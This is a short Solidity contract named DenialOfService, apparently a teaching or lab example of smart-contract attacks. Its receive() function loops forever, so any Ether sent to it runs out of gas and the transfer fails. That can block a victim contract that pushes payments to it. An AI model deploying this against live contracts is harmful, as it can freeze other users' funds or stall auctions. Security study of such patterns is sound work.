// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialOfService {
    receive() external payable {
        uint256 i = 0;
        while(true) {
            i++;
        }
    }
}